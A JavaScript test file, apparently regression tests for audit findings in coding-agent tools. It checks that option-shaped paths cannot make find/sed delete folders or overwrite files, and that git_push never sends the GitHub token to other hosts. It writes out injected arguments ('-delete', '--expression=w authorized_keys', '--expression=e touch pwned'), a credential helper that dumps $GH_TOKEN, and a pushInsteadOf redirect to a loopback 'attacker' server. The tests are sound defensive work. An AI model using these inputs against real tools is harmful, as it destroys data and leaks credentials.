// Audit items 9 and 10, run for real: the commands coding.mjs builds go to a local bash
// (fake runner) inside a temp dir, and git pushes to a loopback HTTP server.
//  • 9: a path starting with "-" became an option of find/sed: listar_arquivos("-delete")
//    erased the cwd and ler_arquivo("--expression=w FILE") truncated FILE, both tools
//    with no confirmation.
//  • 10: git_push's credential helper answered any host, so a remote pointing elsewhere
//    received the user's GitHub token.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { execFile, execFileSync } from 'node:child_process';

let semGit = false;
try { execFileSync('git', ['--version']); execFileSync('sed', ['--version']); } catch { semGit = true; }
const SKIP = semGit ? 'needs git and GNU sed' : false;

process.env.DEVEXEC_URL = 'http://runner.invalid';
process.env.DEVEXEC_TOKEN = 'token-de-teste';
const { codingTools } = await import('../web/coding.mjs');

const TOKEN = 'ghp_FAKE_TEST_TOKEN';
let cwd;
// Fake runner: runs the command with bash in `cwd`, GH_TOKEN in the env like the real one.
globalThis.fetch = async (_url, opts) => {
  const { cmd, token } = JSON.parse(opts.body);
  const env = { PATH: process.env.PATH, HOME: cwd, GIT_TERMINAL_PROMPT: '0', GIT_CONFIG_NOSYSTEM: '1', https_proxy: 'http://127.0.0.1:1', ...(token ? { GH_TOKEN: token } : {}) };
  const r = await new Promise((res) => execFile('bash', ['-c', cmd], { cwd, env, timeout: 20_000 }, (e, stdout, stderr) => res({ exit: e ? (e.code ?? 1) : 0, stdout, stderr })));
  return { status: 200, text: async () => JSON.stringify({ ok: r.exit === 0, exit: r.exit, saida: r.stdout, stderr: r.stderr }) };
};
const tool = (name) => codingTools('u1', { project: { ownerUserId: 'u1', nome: 'p' }, getGithubToken: async () => TOKEN }).find((t) => t.name === name);
const novoDir = () => { cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'coding-')); return cwd; };

test('listar_arquivos with a "-delete" path does not erase the folder', { skip: SKIP }, async () => {
  const d = novoDir();
  fs.writeFileSync(path.join(d, 'x'), 'keep');
  fs.mkdirSync(path.join(d, 'src'));
  fs.writeFileSync(path.join(d, 'src', 'app.js'), 'keep');
  await tool('listar_arquivos').run({ caminho: '-delete', padrao: 'x' });
  await tool('listar_arquivos').run({ caminho: '-delete' });
  assert.ok(fs.existsSync(path.join(d, 'x')));
  assert.ok(fs.existsSync(path.join(d, 'src', 'app.js')));
});

test('ler_arquivo and buscar_no_codigo treat an option-shaped path as a file name', { skip: SKIP }, async () => {
  const d = novoDir();
  fs.writeFileSync(path.join(d, 'authorized_keys'), 'ssh-ed25519 AAAA\n');
  fs.writeFileSync(path.join(d, '1,400p'), 'line\n');
  await tool('ler_arquivo').run({ caminho: '--expression=w authorized_keys' });
  await tool('ler_arquivo').run({ caminho: '--expression=e touch pwned' });
  assert.equal(fs.readFileSync(path.join(d, 'authorized_keys'), 'utf8'), 'ssh-ed25519 AAAA\n');
  assert.ok(!fs.existsSync(path.join(d, 'pwned')));
  // A file really named "-notes.txt" can still be read and searched.
  fs.writeFileSync(path.join(d, '-notes.txt'), 'hello\n');
  assert.match(await tool('ler_arquivo').run({ caminho: '-notes.txt' }), /1\thello/);
  assert.match(await tool('buscar_no_codigo').run({ padrao: 'hello', caminho: '-notes.txt' }), /hello/);
});

// Loopback "attacker" git server: answers 401 and records every Authorization header.
async function servidorEspiao() {
  const vistos = [];
  const srv = http.createServer((req, res) => {
    if (req.headers.authorization) vistos.push(Buffer.from(req.headers.authorization.replace(/^Basic /, ''), 'base64').toString());
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="x"' }).end();
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  return { url: `http://127.0.0.1:${srv.address().port}/x.git`, vistos, fechar: () => srv.close() };
}
function repo(d) {
  const g = (...a) => execFileSync('git', ['-C', d, ...a], { env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1', HOME: d } });
  g('init', '-q'); g('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'x');
  return g;
}

test('git_push never sends the GitHub token to a host other than github.com', { skip: SKIP }, async () => {
  const espiao = await servidorEspiao();
  try {
    const d = novoDir();
    const g = repo(d);
    // Remote passed as a URL, a remote named "evil", and "origin" on github.com but
    // rewritten for push to the attacker by the repo's own config (pushInsteadOf).
    g('remote', 'add', 'evil', espiao.url);
    g('remote', 'add', 'origin', 'https://github.com/o/r.git');
    g('config', `url.${espiao.url.replace(/x\.git$/, '')}.pushInsteadOf`, 'https://github.com/');
    // A helper the repo itself configured must not run either.
    g('config', 'credential.helper', '!f(){ echo "$GH_TOKEN" > leaked; };f');
    for (const remote of [espiao.url, 'evil', 'origin']) {
      const out = JSON.parse(await tool('git_push').run({ remote, branch: 'HEAD' }));
      assert.equal(out.ok, false);
    }
    assert.deepEqual(espiao.vistos.filter((v) => v.includes(TOKEN)), []);
    assert.ok(!fs.existsSync(path.join(d, 'leaked')));
  } finally { espiao.fechar(); }
});

test('git_push to a github.com remote is not blocked by the remote check', { skip: SKIP }, async () => {
  const d = novoDir();
  const g = repo(d);
  g('remote', 'add', 'origin', 'https://github.com/o/r.git');
  // The runner env sends https traffic to a dead proxy: the push fails on connect, without
  // leaving the machine. Failing there (and not on the remote check) is the proof it was accepted.
  const out = JSON.parse(await tool('git_push').run({ branch: 'HEAD' }));
  assert.equal(out.ok, false);
  assert.match(out.saida, /127\.0\.0\.1|proxy|connect/i);
  assert.doesNotMatch(out.saida, /só vai para https:\/\/github\.com/);
});
